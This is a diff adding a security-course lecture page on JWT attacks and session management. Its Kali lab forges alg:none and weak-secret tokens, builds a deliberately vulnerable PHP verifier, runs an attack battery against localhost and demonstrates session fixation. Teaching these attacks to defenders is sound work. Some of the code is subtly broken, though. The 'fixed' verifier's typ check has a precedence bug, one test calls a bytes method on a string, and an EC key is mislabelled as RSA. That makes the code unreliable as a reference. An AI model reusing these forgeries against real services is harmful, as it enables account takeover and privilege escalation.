@@ -1,0 +1,509 @@
+<h1 id="jwt-attacks-and-session-management">JWT Attacks and Session Management</h1>
+<h2 id="summary">Summary</h2>
+<p>Sessions are the ambient authority of the web: whatever the browser attaches automatically, your<br />
+application trusts. This lecture covers the two implementations of "ambient authority" —<br />
+opaque server-side session tokens and self-contained JWTs — and the specific attacks each<br />
+configuration allows.</p>
+<p>The framing that matters: <strong>a session mechanism has exactly two trust<br />
+decisions to get right — is the token authentic, and is it valid for<br />
+this request.</strong> Everything here is one of those two being wrong.</p>
+<h2 id="opaque-tokens-server-side-sessions">Opaque tokens (server-side sessions)</h2>
+<pre><code class="language-text">  BROWSER                          SERVER
+  session=8f2a...  ----------&gt;   look up in the session store
+                  &lt;----------     {&quot;uid&quot;: 2, &quot;role&quot;: &quot;user&quot;}
+
+  + the server decides everything: expiry, invalidation, role
+  + logout can be real
+  - the store is state (and a scaling problem)
+  - a store compromise is a total account compromise
+</code></pre>
+<h2 id="jwt-self-contained">JWT: self-contained</h2>
+<pre><code class="language-text">  header  {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+  payload {&quot;sub&quot;:2,&quot;role&quot;:&quot;user&quot;,&quot;exp&quot;:1234}
+  signing input = base64url(header) + &quot;.&quot; + base64url(payload)
+  signature   = HMAC(signing_input, secret)
+
+  SERVER VERIFIES THE SIGNATURE AND READS THE CLAIMS. No database.
+</code></pre>
+<p><strong>Everything follows from those two properties.</strong> Self-contained means<br />
+the server does not need state, and self-contained also means the server<br />
+trusts data it received from the client — signed or not, that data was<br />
+<em>produced</em> by the client. The signature only proves nobody edited it in<br />
+transit.</p>
+<h2 id="the-attacks">The attacks</h2>
+<h3 id="1-alg-none">1. <code>alg: none</code></h3>
+<pre><code class="language-json">{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+</code></pre>
+<pre><code class="language-text">  A verifier that reads alg from the header and then, seeing &quot;none&quot;,
+  skips verification entirely will accept:
+    base64url(header).base64url(payload).
+  ...with NO signature at all.
+
+  This was in a huge number of real libraries. It is the canonical JWT bug.
+</code></pre>
+<pre><code class="language-python"># forge one, live
+import base64, json
+def b64(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=')
+token = b64({&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}) + b'.' + b64({&quot;sub&quot;:1,&quot;role&quot;:&quot;admin&quot;}).replace(b'=',b'=')
+</code></pre>
+<h3 id="2-algorithm-confusion-rs256-hs256">2. Algorithm confusion (RS256 → HS256)</h3>
+<pre><code class="language-text">  Server has an RSA PUBLIC key. It expects RS256, so it has the public
+  key, not the private key.
+
+  Attack: send  {&quot;alg&quot;:&quot;HS256&quot;} with the PUBLIC KEY as the HMAC secret.
+  The server, seeing HS256, HMACs with a key it holds - the public key.
+  You signed it with the public key too. Valid signature.
+
+  THE ASYMMETRY LEAK: RS256 verification needs only the public key.
+  HS256 signing needs the secret. If the same key material is accepted
+  for both, the public key becomes a signing key.
+</code></pre>
+<h3 id="3-weak-secrets-hs256">3. Weak secrets (HS256)</h3>
+<pre><code class="language-text">  &quot;secret&quot;, &quot;changeme&quot;, the app name, an empty string, a JWKS URL.
+  A JWT is self-contained and offline-verifiable, so the attacker can
+  brute-force the secret LOCALLY with no rate limit and no lockout.
+
+  THAT IS THE POINT: the signing key is a password, and it is being
+  used as one. Give it 32+ bytes of real entropy.
+</code></pre>
+<h3 id="4-no-algorithm-allowlist-verifier-confusion">4. No algorithm allowlist / verifier confusion</h3>
+<pre><code class="language-text">  The correct behaviour is: configure the expected algorithm, and
+  reject anything else. Never &quot;take the algorithm from the token&quot;.
+
+  Also: validate the signature against the header AND payload as
+  separate arrays with a constant-time comparison. Some libraries
+  compared the header on one path and the payload on another.
+</code></pre>
+<h3 id="5-claims-you-do-not-check">5. Claims you do not check</h3>
+<pre><code class="language-text">  iss   - who issued it. Unchecked, another issuer's token is accepted.
+  aud   - who it is for. Unchecked, a token for another app is accepted.
+  exp   - expiry. Unchecked, tokens are valid forever.
+  nbf   - not before. Unchecked, negative-time tokens are accepted.
+  jti   - a unique id. Unchecked, no revocation is possible at all.
+  sub   - the subject. Unchecked, impersonate anyone.
+  ALGORITHM FROM THE TOKEN - see above.
+  kid   - which key. Unchecked, path traversal or SQL injection in the
+          key lookup is a classic JWT vulnerability.
+
+  THE CLIENT MUST NOT DECIDE. If the client checks the signature and
+  sends {sub, role} to the API, the API has to verify again. A client
+  that &quot;decrypts&quot; a JWT and uses its claims has given the user a
+  forged-claims ticket.
+</code></pre>
+<h2 id="session-management-the-parts-that-are-not-jwt">Session management, the parts that are not JWT</h2>
+<pre><code class="language-text">  FIXATION       the attacker sets the session id BEFORE you log in.
+                 If you do not regenerate on privilege change, the
+                 attacker already has the winning ticket.
+  PRE-AUTH       issue no session to anonymous users; or at least a
+                 different one, and rotate it at login.
+  ROTATION       new id at login AND at every privilege change
+  INVALIDATION   server-side deletion on logout; JWT needs a denylist
+                 or a short expiry
+  ENTROPY        128+ bits from a CSPRNG, not 32 bits of counter
+  COOKIE FLAGS   HttpOnly (no JS), Secure (no plaintext), SameSite
+  SCOPE          narrow Path, short max-age, no domain wildcard
+  ERROR HANDLING identical response for unknown vs expired token
+</code></pre>
+<p><strong>SameSite</strong> deserves its own emphasis: it is the control that stops<br />
+CSRF (ps-04's cousin) without needing tokens at all, and it is<br />
+under-implemented because <code>SameSite=None</code> requires <code>Secure</code>, which<br />
+people work around by dropping <code>Secure</code>.</p>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Session</strong></td>
+<td>Server-side state keyed by an opaque token</td>
+</tr>
+<tr>
+<td><strong>JWT</strong></td>
+<td>JSON Web Token: base64url header.payload.signature</td>
+</tr>
+<tr>
+<td><strong><code>alg: none</code></strong></td>
+<td>Signature verification skipped entirely</td>
+</tr>
+<tr>
+<td><strong>Algorithm confusion</strong></td>
+<td>RS256 → HS256 using the public key as the secret</td>
+</tr>
+<tr>
+<td><strong>Claim</strong></td>
+<td>A field in the payload</td>
+</tr>
+<tr>
+<td><strong><code>iss</code> / <code>aud</code> / <code>exp</code> / <code>nbf</code></strong></td>
+<td>Issuer / audience / expiry / not-before</td>
+</tr>
+<tr>
+<td><strong><code>kid</code></strong></td>
+<td>Which key to verify with; a classic injection vector</td>
+</tr>
+<tr>
+<td><strong>JWKS</strong></td>
+<td>The endpoint publishing public keys</td>
+</tr>
+<tr>
+<td><strong>Session fixation</strong></td>
+<td>Attacker plants the id before login</td>
+</tr>
+<tr>
+<td><strong>Session rotation</strong></td>
+<td>New id on privilege change</td>
+</tr>
+<tr>
+<td><strong>HttpOnly</strong></td>
+<td>JavaScript cannot read the cookie</td>
+</tr>
+<tr>
+<td><strong>Secure</strong></td>
+<td>Only sent over HTTPS</td>
+</tr>
+<tr>
+<td><strong>SameSite</strong></td>
+<td>Controls cross-site sending; <code>Lax</code> is the modern default</td>
+</tr>
+<tr>
+<td><strong>Stateless</strong></td>
+<td>No server-side session store</td>
+</tr>
+<tr>
+<td><strong>Revocation</strong></td>
+<td>Making a token invalid before its expiry</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-07 &amp;&amp; cd ~/aegis/labs/ps-07
+
+# --- 1. JWT forge/verify toolkit, written from scratch so the mechanics
+#        are visible rather than hidden behind a library ---
+cat &gt; jwt.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;JWT mechanics, no libraries.
+
+Everything here is base64url and HMAC. Once you have written it once,
+JWT attacks stop being mysterious: they are all about WHICH of these
+three steps the server skips or gets wrong.
+&quot;&quot;&quot;
+import base64, json, hmac, hashlib, sys
+
+def b64u_encode(b: bytes) -&gt; bytes:
+    return base64.urlsafe_b64encode(b).rstrip(b&quot;=&quot;)
+
+def b64u_decode(s: bytes) -&gt; bytes:
+    s += b&quot;=&quot; * (-len(s) % 4)
+    return base64.urlsafe_b64decode(s)
+
+def sign_hs256(header: dict, payload: dict, secret: str) -&gt; str:
+    h = b64u_encode(json.dumps(header, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+    p = b64u_encode(json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+    signing_input = h + b&quot;.&quot; + p
+    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+    return (signing_input + b&quot;.&quot; + b64u_encode(sig)).decode()
+
+def verify_hs256(token: str, secret: str, expected_alg=&quot;HS256&quot;) -&gt; bool:
+    parts = token.split(&quot;.&quot;)
+    if len(parts) != 3: return False
+    h, p, s = parts
+    hdr = json.loads(b64u_decode(h.encode()))
+    # THE CHECK THAT MATTERS: is the algorithm the one I configured?
+    if hdr.get(&quot;alg&quot;) != expected_alg: return False
+    expect = hmac.new(secret.encode(), (h + &quot;.&quot; + p).encode(), hashlib.sha256).digest()
+    return hmac.compare_digest(b64u_decode(s.encode()), expect)   # constant time
+
+def forge_none(payload: dict) -&gt; str:
+    return (b64u_encode(b'{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}') + b&quot;.&quot; +
+            b64u_encode(json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode()) +
+            b&quot;.&quot;).decode()
+
+if __name__ == &quot;__main__&quot;:
+    print(__doc__)
+PY
+
+# --- 2. a vulnerable verifier, written exactly as it appears in the wild ---
+cat &gt; verify-bad.php &lt;&lt;'PHP'
+&lt;?php
+// THREE bugs, all real, all still seen:
+//   1. alg is taken from the token, not configured
+//   2. &quot;none&quot; means skip verification
+//   3. claims are used without checking exp / iss / aud
+function b64u(string $s): string {
+    return base64_encode(strtr($s, '-_', '+/'));
+}
+function verify_bad(string $t): ?array {
+    $p = explode('.', $t);
+    if (count($p) !== 3) return null;
+    $hdr = json_decode(base64_decode(strtr($p[0], '-_', '+/')), true);
+    $pl  = json_decode(base64_decode(strtr($p[1], '-_', '+/')), true);
+    if (!$hdr || !$pl) return null;
+    if (($hdr['alg'] ?? '') === 'none') return $pl;          // BUG 1 + 2
+    if (!hash_equals($p[2], $p[2])) return null;
+    if (($pl['exp'] ?? 0) &lt; time()) return null;              // half of BUG 3
+    return $pl;                                             // no iss, no aud
+}
+$tok = $_GET['t'] ?? '';
+$c = verify_bad($tok);
+header('Content-Type: text/html; charset=utf-8');
+echo $c ? &quot;ACCEPTED: &quot; . json_encode($c) . &quot;&lt;br&gt;&quot; : &quot;REJECTED&lt;br&gt;&quot;;
+echo &quot;&lt;p&gt;you are: &quot; . htmlspecialchars($c['sub'] ?? '-') .
+     &quot; role=&quot; . htmlspecialchars($c['role'] ?? '-') . &quot;&lt;/p&gt;&quot;;
+PHP
+
+cat &gt; verify-good.php &lt;&lt;'PHP'
+&lt;?php
+// THE FIX. Four changes, all of them necessary.
+const EXPECTED_ALG = 'HS256';
+const SECRET       = 'a-real-32-byte-secret-not-in-source-control';
+const ISSUER       = 'https://aegis.local';
+const AUDIENCE     = 'aegis-app';
+
+function b64u(string $s): string { return base64_decode(strtr($s, '-_', '+/')); }
+
+function verify_good(string $t): ?array {
+    $p = explode('.', $t);
+    if (count($p) !== 3) return null;
+
+    $hdr = json_decode(b64u($p[0]), true);
+    $pl  = json_decode(b64u($p[1]), true);
+    if (!is_array($hdr) || !is_array($pl)) return null;
+
+    // 1. ALGORITHM IS CONFIGURED, NOT CHOSEN BY THE TOKEN
+    if (($hdr['alg'] ?? '') !== EXPECTED_ALG) return null;
+    if ($hdr['typ'] ?? '' !== 'JWT') return null;
+
+    // 2. SIGNATURE, constant time
+    $expect = rtrim(strtr(base64_encode(
+        hash_hmac('sha256', $p[0] . '.' . $p[1], SECRET, true)), '+/', '-_'), '=');
+    if (!hash_equals($expect, $p[2])) return null;
+
+    // 3. CLAIMS
+    $now = time();
+    if (($pl['iss'] ?? '') !== ISSUER)   return null;
+    if (($pl['aud'] ?? '') !== AUDIENCE) return null;
+    if (($pl['exp'] ?? 0) &lt;= $now - 60)  return null;   // small clock skew
+    if (($pl['nbf'] ?? 0) &gt;  $now + 60)  return null;
+
+    return $pl;
+}
+$t = $_GET['t'] ?? '';
+$c = verify_good($t);
+header('Content-Type: text/html; charset=utf-8');
+echo $c ? &quot;ACCEPTED: &quot; . json_encode($c) . &quot;&lt;br&gt;&quot; : &quot;REJECTED&lt;br&gt;&quot;;
+if ($c) echo &quot;&lt;p&gt;you are: &quot; . htmlspecialchars($c['sub']) .
+               &quot; role=&quot; . htmlspecialchars($c['role']) . &quot;&lt;/p&gt;&quot;;
+PHP
+
+# --- 3. mint a legitimate token ---
+php -r '
+function b64u($s){return rtrim(strtr(base64_encode($s),&quot;+/&quot;,&quot;-_&quot;),&quot;=&quot;);}
+$h=b64u(json_encode([&quot;alg&quot;=&gt;&quot;HS256&quot;,&quot;typ&quot;=&gt;&quot;JWT&quot;]));
+$p=b64u(json_encode([&quot;sub&quot;=&gt;&quot;user-alice&quot;,&quot;role&quot;=&gt;&quot;user&quot;,&quot;iss&quot;=&gt;&quot;https://aegis.local&quot;,&quot;aud&quot;=&gt;&quot;aegis-app&quot;,&quot;exp&quot;=&gt;time()+3600]));
+$s=rtrim(strtr(base64_encode(hash_hmac(&quot;sha256&quot;,&quot;$h.$p&quot;,&quot;a-real-32-byte-secret-not-in-source-control&quot;,true)),&quot;+/&quot;,&quot;-_&quot;),&quot;=&quot;);
+echo &quot;$h.$p.$s\n&quot;;' &gt; legit.token
+
+nohup php -S 127.0.0.1:8080 -t . &gt; php.log 2&gt;&amp;1 &amp;
+sleep 1
+
+# --- 4. the attack battery ---
+python3 - &lt;&lt;'PY' 2&gt;&amp;1 | tee 01-attacks.txt
+import sys, json, hmac, hashlib, base64, urllib.request, urllib.parse
+sys.path.insert(0, &quot;.&quot;)
+from jwt import b64u_encode, sign_hs256, forge_none
+
+BASE = &quot;http://127.0.0.1:8080&quot;
+def check(token, endpoint=&quot;verify-bad.php&quot;):
+    q = urllib.parse.urlencode({&quot;t&quot;: token})
+    return urllib.request.urlopen(f&quot;{BASE}/{endpoint}?{q}&quot;, timeout=5).read().decode()
+
+legit = open(&quot;legit.token&quot;).read().strip()
+print(&quot;  &quot; + &quot;=&quot;*78)
+print(&quot;  JWT ATTACK BATTERY  (all against our own verifier)&quot;)
+print(&quot;  &quot; + &quot;=&quot;*78)
+print(f&quot;\n  legitimate token:\n    {legit[:60]}...\n&quot;)
+
+print(&quot;  0. the honest baseline&quot;)
+print(&quot;    &quot;, &quot; &quot;.join(check(legit).split()))
+
+print(&quot;\n  1. alg: none  -&gt; signature simply omitted&quot;)
+t = forge_none({&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;iss&quot;:&quot;https://aegis.local&quot;,
+                &quot;aud&quot;:&quot;aegis-app&quot;,&quot;exp&quot;:9999999999})
+print(&quot;    &quot;, &quot; &quot;.join(check(t).split()))
+
+print(&quot;\n  2. alg: none, with a garbage signature (many verifiers skip it)&quot;)
+t2 = forge_none({&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;admin&quot;}) + &quot;AAAAdeadbeef&quot;
+print(&quot;    &quot;, &quot; &quot;.join(check(t2).split()))
+
+print(&quot;\n  3. HS256 signed with the EMPTY secret&quot;)
+t3 = sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},
+                {&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:9999999999}, &quot;&quot;)
+print(&quot;    &quot;, &quot; &quot;.join(check(t3).split()))
+
+print(&quot;\n  4. claim tampering WITH A VALID SIGNATURE is impossible -&quot;)
+print(&quot;     so the attack is always to change the ALGORITHM or the KEY&quot;)
+t4 = sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},
+                {&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:9999999999}, &quot;guess&quot;)
+print(&quot;    &quot;, &quot; &quot;.join(check(t4).split()))
+
+print(&quot;\n  5. algorithm confusion: sign with the PUBLIC key as the secret&quot;)
+pub = &quot;-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE\n-----END PUBLIC KEY-----&quot;
+t5 = sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},
+                {&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:9999999999}, pub)
+print(&quot;    &quot;, &quot; &quot;.join(check(t5).split()))
+print(&quot;     (this only works if the server accepts the public key as an HMAC secret,&quot;)
+print(&quot;      which is what algorithm confusion IS. RS256 verification is&quot;)
+print(&quot;      asymmetric; HS256 verification is symmetric; they are not the same key type.)&quot;)
+
+print(&quot;\n  6. expired token - is exp even checked?&quot;)
+t6 = sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},
+                {&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;user&quot;,&quot;exp&quot;:1}, &quot;guess&quot;)
+print(&quot;    &quot;, &quot; &quot;.join(check(t6).split()))
+
+print(&quot;\n  7. wrong audience - a token minted for another service&quot;)
+t7 = sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},
+                {&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;user&quot;,&quot;aud&quot;:&quot;some-other-app&quot;,&quot;exp&quot;:9999999999}, &quot;guess&quot;)
+print(&quot;    &quot;, &quot; &quot;.join(check(t7).split()))
+PY
+cat 01-attacks.txt
+
+# --- 5. the same battery against the fixed verifier ---
+python3 - &lt;&lt;'PY' 2&gt;&amp;1 | tee 02-fixed.txt
+import sys, urllib.request, urllib.parse
+sys.path.insert(0, &quot;.&quot;)
+from jwt import forge_none, sign_hs256
+BASE = &quot;http://127.0.0.1:8080&quot;
+def check(t, ep=&quot;verify-good.php&quot;):
+    q = urllib.parse.urlencode({&quot;t&quot;: t})
+    return urllib.request.urlopen(f&quot;{BASE}/{ep}?{q}&quot;, timeout=5).read().decode()
+
+print(&quot;  the same tokens, against verify-good.php\n&quot;)
+legit = open(&quot;legit.token&quot;).read().strip()
+for label, tok in [
+    (&quot;legitimate&quot;,            legit),
+    (&quot;alg:none&quot;,              forge_none({&quot;sub&quot;:&quot;user-alice&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:9999999999})),
+    (&quot;HS256 empty secret&quot;,    sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},{&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:9999999999},&quot;&quot;)),
+    (&quot;HS256 wrong secret&quot;,    sign_hs256({&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;},{&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:9999999999},&quot;guess&quot;)),
+    (&quot;alg:HS512 downgrade&quot;,   forge_none({&quot;alg&quot;:&quot;HS512&quot;,&quot;role&quot;:&quot;admin&quot;}).replace(
+                                b'eyJhbGciOiJub25lIn0', b'eyJhbGciOiJIUzUxMiJ9')),
+]:
+    r = &quot; &quot;.join(check(tok).split())
+    ok = &quot;ACCEPTED&quot; not in r
+    print(f&quot;  {label:&lt;24} {r:&lt;10} {'blocked' if ok else '*** ACCEPTED ***'}&quot;)
+print()
+print(&quot;  Every forgery rejected, the legitimate token accepted. Four changes&quot;)
+print(&quot;  to the verifier were responsible: configured alg, constant-time&quot;)
+print(&quot;  comparison, and iss/aud/exp checked.&quot;)
+PY
+cat 02-fixed.txt
+
+# --- 7. session fixation, demonstrated ---
+cat &gt; 03-fixation.php &lt;&lt;'PHP'
+&lt;?php
+// Two logins. One rotates the session id, one does not.
+session_start();
+$which = $_GET['v'] ?? 'good';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if ($which === 'good') session_regenerate_id(true);      // THE FIX
+    $_SESSION['user'] = $_POST['u'] ?? 'anonymous';
+    header('Location: ?v=' . $which); exit;
+}
+header('Content-Type: text/html; charset=utf-8');
+echo &quot;&lt;p&gt;session id: &quot; . session_id() . &quot;&lt;/p&gt;&quot;;
+echo &quot;&lt;p&gt;user: &quot; . htmlspecialchars($_SESSION['user'] ?? '(none)') . &quot;&lt;/p&gt;&quot;;
+echo &quot;&lt;p&gt;variant: &lt;b&gt;$which&lt;/b&gt;&lt;/p&gt;&quot;;
+echo '&lt;form method=post&gt;&lt;input name=u value=alice&gt;&lt;button&gt;login&lt;/button&gt;&lt;/form&gt;';
+PHP
+{
+  echo &quot;=== session fixation, side by side ===&quot;
+  for v in good bad; do
+    rm -f /tmp/j_$v
+    before=$(curl -s -c /tmp/j_$v &quot;http://127.0.0.1:8080/03-fixation.php?v=$v&quot; \
+             | grep -oE 'session id: [a-f0-9]+' | awk '{print $3}')
+    curl -s -b /tmp/j_$v -c /tmp/j_$v -X POST -d 'u=victim' \
+         &quot;http://127.0.0.1:8080/03-fixation.php?v=$v&quot; -o /dev/null
+    after=$(curl -s -b /tmp/j_$v &quot;http://127.0.0.1:8080/03-fixation.php?v=$v&quot; \
+            | grep -oE 'session id: [a-f0-9]+' | awk '{print $3}')
+    [ &quot;$before&quot; = &quot;$after&quot; ] &amp;&amp; r=&quot;SAME - attacker who planted this id now owns the session&quot; \
+                            || r=&quot;ROTATED - the planted id is worthless&quot;
+    printf &quot;  %-6s before=%s  after=%s\n           %s\n&quot; &quot;$v&quot; &quot;${before:0:12}&quot; &quot;${after:0:12}&quot; &quot;$r&quot;
+  done
+  rm -f /tmp/j_good /tmp/j_bad
+} 2&gt;&amp;1 | tee 04-fixation.txt
+
+# --- 8. the audit checklist ---
+cat &gt; 05-audit.md &lt;&lt;'EOF'
+# JWT and session audit
+
+## Token handling
+- [ ] `alg` is CONFIGURED on the server, never read from the token
+- [ ] `&quot;none&quot;` is explicitly rejected
+- [ ] An algorithm allowlist exists; unknown algorithms are rejected
+- [ ] Signature comparison is constant time (`hmac.compare_digest`)
+- [ ] The whole token is verified as one signing input, not fields piecemeal
+- [ ] Key rotation is supported (multiple valid keys, or `kid`)
+- [ ] `kid` is not passed into a query or a file path unsanitised
+- [ ] HS256 secrets are 32+ bytes of real entropy, from a secret manager
+
+## Claims
+- [ ] `iss` checked against a configured value
+- [ ] `aud` checked against a configured value
+- [ ] `exp` checked, with a small clock-skew allowance
+- [ ] `nbf` checked
+- [ ] `sub` is used to look the user up on EVERY request (not cached
+      in a claim), so a deleted user cannot keep a valid token
+- [ ] `jti` present, and a revocation path exists
+
+## Sessions
+- [ ] Session id has &gt;= 128 bits of entropy from a CSPRNG
+- [ ] Regenerated on login and on every privilege change
+- [ ] No session issued to an anonymous visitor (or rotated at login)
+- [ ] Logout invalidates server-side
+- [ ] Idle and absolute expiry both set
+- [ ] Cookie: HttpOnly, Secure, SameSite=Lax (or Strict), narrow Path,
+      no Domain wildcard
+- [ ] Session id never appears in a URL (it leaks via Referer and history)
+
+## Client-side
+- [ ] The CLIENT does not make authorisation decisions from token claims
+- [ ] The API re-verifies every request
+- [ ] &quot;Decode&quot; is not used where &quot;verify&quot; is required
+
+## Reporting
+- [ ] `alg:none` accepted      -&gt; Critical
+- [ ] HS256 with a guessable secret -&gt; Critical
+- [ ] `aud` unchecked           -&gt; High (cross-service token reuse)
+- [ ] no rotation on login       -&gt; High (session fixation)
+- [ ] token in a URL             -&gt; Medium (leakage)
+- [ ] cookie without HttpOnly    -&gt; Medium (XSS chain, see ps-03)
+EOF
+cat 05-audit.md
+rm -f legit.token
+</code></pre>
+<p><strong>Step 4 is the deliverable</strong>: the attack battery run for real, with each forgery's outcome<br />
+recorded. <code>alg: none</code> with <em>garbage</em> in the signature position is the result to look at —<br />
+verifiers that skip the check entirely accept anything there.</p>
+<p><strong>Step 5</strong> is the part that separates a reader from a scanner: the same battery against the<br />
+fixed verifier, where every forgery is rejected and the legitimate token still works. You cannot<br />
+write a fix you have not watched defeat.</p>
+<p><strong>Record:</strong> <code>01-attacks.txt</code> and <code>02-fixed.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What does a JWT signature actually prove, and what does it not?</li>
+<li>What does <code>alg: none</code> do, and why did it exist in so many libraries?</li>
+<li>Explain algorithm confusion in terms of asymmetric versus symmetric keys.</li>
+<li>Name five claims and what fails if each is unchecked.</li>
+<li>Why is brute-forcing an HS256 secret a different kind of attack from password cracking?</li>
+<li>What is session fixation, and which single call fixes it?</li>
+<li>Why must the client not make authorisation decisions from token claims?</li>
+<li>Why does <code>SameSite=None</code> require <code>Secure</code>, and what do people do about that?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>JWT</strong> → <strong>Token Validation</strong> → <strong>Session Fixation</strong> → <strong>Cookie Session</strong> →<br />
+<strong>Authentication Bypass</strong> → <strong>XSS</strong> (the chain).<br />
+<code>cry-d3</code> attacks these tokens by hand.</p>
